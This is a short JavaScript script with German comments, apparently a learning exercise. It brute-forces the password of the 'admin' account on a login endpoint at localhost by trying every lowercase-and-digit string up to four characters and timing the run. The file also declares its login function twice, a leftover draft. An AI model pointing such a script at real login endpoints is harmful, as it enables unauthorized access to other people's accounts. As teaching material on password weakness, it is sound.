async function tryLogin(username, password) {
    // 1. Anfrage an den Server schicken und auf die Antwort warten (await)
    const response = await fetch("http://localhost:3000/login", {
        method: "POST",                                  
        headers: { "Content-Type": "application/json" }, 
        body: JSON.stringify({ username, password }),    // Objekt -> JSON-Text
  });
    return response.status === 200


}
tryLogin("admin", "cat").then((ok) => console.log("Treffer?", ok));

const charset = "abcdefghijklmnopqrstuvwxyz0123456789";
const maxLength = 4;
const username = "admin";

// Schickt einen einzelnen Login-Versuch, true = Treffer
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  return response.status === 200;
}

// Baut Passwörter Zeichen für Zeichen auf; testet, sobald die Ziel-Länge erreicht ist
async function buildAndTry(prefix, length) {
  if (prefix.length === length) {
    const found = await tryLogin(username, prefix);
    if (found) {
      console.log("Passwort gefunden:", prefix);
      return true;
    }
    return false;
  }

  for (const char of charset) {
    const found = await buildAndTry(prefix + char, length);
    if (found) {
      return true; // Treffer nach oben durchreichen -> Abbruch
    }
  }
  return false;
}

// Probiert Länge 1, dann 2, ... bis maxLength
async function bruteForce() {
  const start = Date.now();

  for (let length = 1; length <= maxLength; length++) {
    console.log("Probiere Länge", length, "...");
    const found = await buildAndTry("", length);
    if (found) {
      break; // gefunden -> keine weiteren Längen mehr
    }
  }

  const seconds = (Date.now() - start) / 1000;
  console.log("Dauer:", seconds, "Sekunden");
}

bruteForce();